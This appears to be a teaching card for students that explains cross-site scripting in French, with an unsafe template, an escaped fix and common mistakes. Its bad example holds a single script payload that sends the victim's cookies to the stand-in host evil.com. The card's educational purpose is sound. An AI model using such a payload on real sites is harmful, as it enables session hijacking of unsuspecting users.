Issue Type: Cross-Site Scripting (XSS)
Category: Security
Severity: Critical

Description:
Une faille XSS survient quand une application insere du contenu fourni par
l'utilisateur dans une page HTML sans l'echapper, permettant a un attaquant
d'injecter du code JavaScript execute dans le navigateur des autres utilisateurs.

Why is it a problem:
Un attaquant peut voler des cookies de session, rediriger l'utilisateur vers un
site malveillant, modifier l'apparence de la page, ou effectuer des actions au
nom de la victime sans qu'elle s'en rende compte.

Bad Example:
<div>Bienvenue {user_input}</div>
# si user_input = "<script>document.location='http://evil.com?c='+document.cookie</script>"

Good Example:
<div>Bienvenue {{ user_input | escape }}</div>
# ou utiliser un moteur de template qui echappe par defaut (Jinja2, React JSX)

How to Fix:
Toujours echapper le contenu utilisateur avant de l'inserer dans le HTML. Utiliser
un moteur de template qui echappe automatiquement (Jinja2, React) plutot que de
construire du HTML par concatenation de chaines.

Common Student Mistakes:
- Utiliser innerHTML en JavaScript au lieu de textContent pour afficher du texte utilisateur
- Faire confiance a une validation cote client uniquement
- Penser que XSS ne concerne que les champs de formulaire visibles (les headers, URLs, cookies peuvent aussi etre vecteurs)

Educational Explanation:
Le navigateur ne fait pas la difference entre "code HTML ecrit par le developpeur"
et "texte utilisateur affiche" si les deux sont melanges sans echappement. L'echappement
transforme les caracteres speciaux (<, >, &, ") en leurs equivalents HTML surs
(&lt;, &gt;, etc.), pour que le navigateur les affiche comme texte, jamais comme
du code a executer.

Related Concepts: Output Encoding, Content Security Policy, Input Validation, Same-Origin Policy